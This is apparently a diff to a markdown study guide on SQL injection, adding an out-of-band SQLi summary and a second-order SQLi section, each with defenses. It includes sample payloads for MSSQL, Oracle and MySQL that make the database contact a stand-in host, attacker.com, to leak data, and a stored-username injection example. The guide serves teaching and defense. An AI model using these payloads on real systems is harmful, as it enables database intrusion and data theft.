@@ -186,9 +186,58 @@ Used when the attacker cannot see output directly or observe timing. Leverages e
 
 - _Example_: `'; SELECT load_file('\\\\attacker.com\\leak') --`
 
+> 🔍 **Out-of-Band SQLi Summary**  
+> - **What is it?**: OOB SQLi is used when attackers cannot use the same channel to exfiltrate data (e.g., no error or timing feedback).  
+> - **How it works**: The database sends data to an external server controlled by the attacker, often using DNS or HTTP requests.  
+> - **Payload Examples**:
+>   - **MSSQL**: `'; exec master..xp_dirtree '\\attacker.com\test' --`
+>   - **Oracle**: `'; UTL_HTTP.REQUEST('http://attacker.com/leak') --`
+>   - **MySQL**: `'; SELECT LOAD_FILE('\\\\attacker.com\\leak') --`
+> - **When used**: Useful when UNION, error, and time-based SQLi aren't viable.  
+> - **Defenses**:
+>   - Disable dangerous functions like `LOAD_FILE`, `xp_cmdshell`, `UTL_HTTP`, etc.  
+>   - Restrict outbound network access from the database server.  
+>   - Use strict input validation and parameterized queries.
+
 > 🧠 Note: This method requires features like `load_file`, `xp_dirtree`, or DNS lookups to be enabled in the DBMS.
 
 ---
+
+### 4. Second-Order SQLi
+
+Second-order SQLi occurs when malicious input is stored by the application (e.g., in a database) and later used unsafely in a different SQL context.
+
+---
+
+**How It Works:**
+- Attacker submits payload in a **non-executing context** (e.g., signup form, profile update).
+- Later, the app **retrieves and uses** that stored data in a vulnerable SQL query **without sanitization**.
+- The SQLi is triggered **indirectly**, making detection harder.
+
+---
+
+**Example Scenario:**
+1. User signs up with a username:  
+   `'admin' --`  
+   (no attack triggered here)
+2. Later, the app runs:  
+   ```sql
+   SELECT * FROM users WHERE username = '$stored_username'
+   ```
+   → SQLi triggers here when `$stored_username` is inserted unsanitized.
+
+---
+
+**Challenges:**
+- Harder to detect during testing (no immediate feedback)
+- Exploitation depends on internal workflows or re-use of data
+
+---
+
+**Defenses:**
+- Sanitize and validate **both at input and output** stages
+- Use **parameterized queries** always, even when reusing stored values
+- Audit flows where stored data is later injected into queries
 
 ## 📉 Injection Attacks Overview
 
